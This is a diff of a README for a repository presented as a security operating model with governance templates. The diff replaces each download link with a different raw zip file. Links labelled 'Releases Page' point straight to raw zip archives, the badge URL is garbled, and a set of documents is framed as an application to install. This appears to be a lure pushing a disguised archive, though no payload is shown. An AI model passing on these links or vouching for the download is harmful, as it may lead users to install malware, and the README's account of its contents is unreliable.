@@ -1,13 +1,13 @@
 # 🔒 security-operating-model - A Practical Approach to Security
 
 ## 🌐 Download Now!
-[![Download](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/docs/security_model_operating_v1.4-alpha.2.zip%20Now-Click%https://github.com/Palorand/security-operating-model/raw/refs/heads/main/docs/security_model_operating_v1.4-alpha.2.zip)](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/docs/security_model_operating_v1.4-alpha.2.zip)
+[![Download](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/mapping/operating-model-security-2.3.zip%20Now-Click%https://github.com/Palorand/security-operating-model/raw/refs/heads/main/mapping/operating-model-security-2.3.zip)](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/mapping/operating-model-security-2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **security-operating-model** repository. This application provides a practical framework for security in engineering-driven organizations. It includes strategic documents, governance templates, and decision frameworks tailored for Security Directors and Architects. You can use our resources to help streamline your security practices.
 
 ## 📥 Download & Install
-To get started with the **security-operating-model**, visit this page to download the latest version: [Releases Page](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/docs/security_model_operating_v1.4-alpha.2.zip).
+To get started with the **security-operating-model**, visit this page to download the latest version: [Releases Page](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/mapping/operating-model-security-2.3.zip).
 
 1. Click on the Releases link above.
 2. Choose the latest release version.
@@ -66,6 +66,6 @@ For questions or issues, please feel free to reach out via the Issues tab on Git
 The **security-operating-model** is licensed under the MIT License. You can freely modify and distribute the software as long as proper credit is given.
 
 ## 🌐 Stay Updated
-Keep an eye on the Releases page to get the latest updates and enhancements: [Releases Page](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/docs/security_model_operating_v1.4-alpha.2.zip).
+Keep an eye on the Releases page to get the latest updates and enhancements: [Releases Page](https://github.com/Palorand/security-operating-model/raw/refs/heads/main/mapping/operating-model-security-2.3.zip).
 
 Thank you for choosing **security-operating-model**. Your commitment to improving security practices in your organization is commendable.
